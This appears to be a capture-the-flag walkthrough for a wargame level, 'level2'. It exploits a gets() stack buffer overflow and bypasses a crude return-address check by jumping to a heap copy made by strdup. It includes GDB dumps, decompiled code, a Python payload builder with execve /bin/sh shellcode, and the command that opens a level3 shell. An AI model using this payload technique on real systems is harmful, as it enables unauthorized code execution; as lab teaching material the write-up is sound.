# Level2
Level2 is a follow up to buffer overflows vulnerabilities. 

# Tools
GDB

# Walkthrough
The home of level2 contains a binary, called level2. 
Using GDB, we can disassemble it and we get the assembly code:
```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
```

We see that the program calls a function p, we can confirm it by asking gdb for information on the used functions in the binary:

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048358  _init
0x080483a0  printf
0x080483a0  printf@plt
0x080483b0  fflush
0x080483b0  fflush@plt
0x080483c0  gets
0x080483c0  gets@plt
0x080483d0  _exit
0x080483d0  _exit@plt
0x080483e0  strdup
0x080483e0  strdup@plt
0x080483f0  puts
0x080483f0  puts@plt
0x08048400  __gmon_start__
0x08048400  __gmon_start__@plt
0x08048410  __libc_start_main
0x08048410  __libc_start_main@plt
0x08048420  _start
0x08048450  __do_global_dtors_aux
0x080484b0  frame_dummy
0x080484d4  p
0x0804853f  main
0x08048550  __libc_csu_init
0x080485c0  __libc_csu_fini
0x080485c2  __i686.get_pc_thunk.bx
0x080485d0  __do_global_ctors_aux
0x080485fc  _fini
```
Let's disassemble p:
```
(gdb) disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

We are going to break at the main, before the call of `p` (address **0x08048545**) and before the `gets` call in `p` (address **0x080484ed**). 

We run the program until we hit our third breakpoint (before the `gets` call).
We dump the content of the stack before inputing in `gets`, we input 4 'A' (`0x41`), and 4 'B' (`0x42`), and redump the content of the memory to check where does our buffer begins.

```
Breakpoint 3, 0x080484ed in p ()
(gdb) x/20x $esp
0xbffff680:	0xbffff69c	0x00000000	0x00000000	0xb7e5ec73
0xbffff690:	0x080482b5	0x00000000	0x00c30000	0x00000001
0xbffff6a0:	0xbffff8bf	0x0000002f	0xbffff6fc	0xb7fd0ff4
0xbffff6b0:	0x08048550	0x08049828	0x00000001	0x08048381
0xbffff6c0:	0xb7fd13e4	0x00000016	0x08049828	0x08048571
(gdb) ni
AAAABBBB
0x080484f2 in p ()
(gdb) x/20x $esp
0xbffff680:	0xbffff69c	0x00000000	0x00000000	0xb7e5ec73
0xbffff690:	0x080482b5	0x00000000	0x00c30000	0x41414141
0xbffff6a0:	0x42424242	0x00000000	0xbffff6fc	0xb7fd0ff4
0xbffff6b0:	0x08048550	0x08049828	0x00000001	0x08048381
0xbffff6c0:	0xb7fd13e4	0x00000016	0x08049828	0x08048571
```
We can see that our 'A' and 'B' have been written starting at address **0xbffff69c**.
The return address for `main` is **0x0804854a**. 

If we dump a little more of the stack, we get:
```
(gdb) x/120x $esp
0xbffff680:	0xbffff69c	0x00000000	0x00000000	0xb7e5ec73
0xbffff690:	0x080482b5	0x00000000	0x00c30000	0x41414141
0xbffff6a0:	0x42424242	0x00000000	0xbffff6fc	0xb7fd0ff4
0xbffff6b0:	0x08048550	0x08049828	0x00000001	0x08048381
0xbffff6c0:	0xb7fd13e4	0x00000016	0x08049828	0x08048571
0xbffff6d0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6e0:	0xb7fed280	0x00000000	0xbffff6f8	0x0804854a
...
```
Where we can see the return address (last piece of data).
So, the return address is stored at **0xbffff6ec**, and the buffer starts at **0xbffff69c**. The buffer obviously grows towards higher addresses, thus we need to write **0xbffff6ec** - **0xbffff69c** = **0x50** = 80 characters before overwriting the return address.

By passing the binary to Hex-Rays, we get an approximative code of `p`:
```c
char *p()
{
  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
  const void *v2; // [esp+5Ch] [ebp-Ch]
  unsigned int retaddr; // [esp+6Ch] [ebp+4h]

  fflush(stdout);
  gets(s);
  v2 = (const void *)retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 ) // 0xB0000000 = -1342177280 (signed) 
  {
    printf("(%p)\n", v2);
    _exit(1);
  }
  puts(s);
  return strdup(s);
}
```

The `if` line is interesting. `(retaddr & 0xB0000000)` will only take the first 4 bytes of `retaddr`, and compare them to `-1342177280`, which is `0xB0000000`. 

For context, in older Linux distributions, that used to run on 32-bit, some memory spaces had known ranges. Typically, the User Space's range was from `0x00000000` from `0xBFFFFFFF` (3GB of the 4GB of the 32bit system), when the Kernel Space's range was from `0xC0000000` to `0xFFFFFFFF` (1GB of the 4GB). When some data from the User Space leaked on the Kernel Space, it was blocked and resulted into a segmentation fault.   

Thus, the `if` line is checking whether or not the return address is located in the User Space, which could mean that it has been tampered. It is a very primitive way of protecting against certain buffer overflows (modern sytems use the NX Flag (non-executable stack) and ASLR (Address Space Layour Randomisation)).

The user space stacks usually started at around `0xC0000000` (at the top of the space) and grew downwards. Thus, they are in the `0xB...` space and making a stack overflow would be interrupted by the `if` line, or it might take an enormous overflow and taking care of many considerations. 

A simpler solution is to make a Heap overflow, as the Heap tends to have lower memory addresses.
Moreover, we see in the code that `p` calls `strdup`, which calls `malloc`, a function used to allocate memory... on the heap!

By running the `level2` binary with `ltrace` multiple times, we see that it always points out to the same return address, `0x0804a008`, which is **NOT** in the `0xB...` range. Good!

```
level1@Rainfall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                            = 0
gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5test
)                                 = 0xbffff6bc
puts("test"test
)                                                                  = 5
strdup("test")                                                                = 0x0804a008
+++ exited (status 8) +++
```

The idea now is to craft a payload that will give us a shell and overwrite the return address by the return address outside of the `0xB...` space, the one of `strdup`!

A shellcode database can be found [here](https://shell-storm.org/shellcode/index.html), we are going to use this [shellcode](https://shell-storm.org/shellcode/files/shellcode-752.html) from kernel_panik. 

We now have a shellcode, a buffer length, and a return address, let's make our payload:
```py
len_buffer = 80
shell_code = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
return_address = b"\x08\xa0\x04\x08"

payload = (
    shell_code +
    b"A" * (len_buffer - len(shell_code)) +
    return_address
)

print(payload)
```
Give yourself all the permissions on the home of level2, `scp` the script onto the machine, redirect its output to a file exploit the binary:
```bash
cat attack.txt - | ./level2
1���Qh//shh/bin��
                  ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
```
Grab the password, and level2 completed!
